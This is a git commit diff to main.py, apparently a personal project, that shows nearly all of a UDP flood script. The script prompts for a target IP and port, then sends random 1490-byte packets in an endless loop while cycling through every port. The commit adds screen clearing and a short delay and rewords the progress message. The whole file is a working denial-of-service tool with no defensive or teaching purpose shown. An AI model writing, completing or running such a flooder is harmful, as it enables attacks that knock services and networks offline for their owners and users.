683f343395907d2c4ed6d5e7991511b281729964
ihatemylife-1 <himgt10@gmail.com>
2025-03-09 13:37:20 -0400

    Update main.py

--- main.py
+++ main.py
@@ -1,23 +1,25 @@
 import socket
 import random
+import os
+import time
 
 def create_socket():
     return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 sock = create_socket()
 packet = random._urandom(1490)
-
+os.system('clear')
 ip = input("Target IP: ")
 port = int(input("Target Port: "))
-
+os.system('clear')
 print("\nStarting UDP flood attack...\n")
-
+time.sleep(1)
 sent = 0
 while True:
     try:
         sock.sendto(packet, (ip, port))
         sent += 1
-        print(f"Sent {sent} packets to {ip} through port {port}")
+        print(f"pakets {sent} to {ip} port {port}")
 
         port += 1
         if port > 65535:
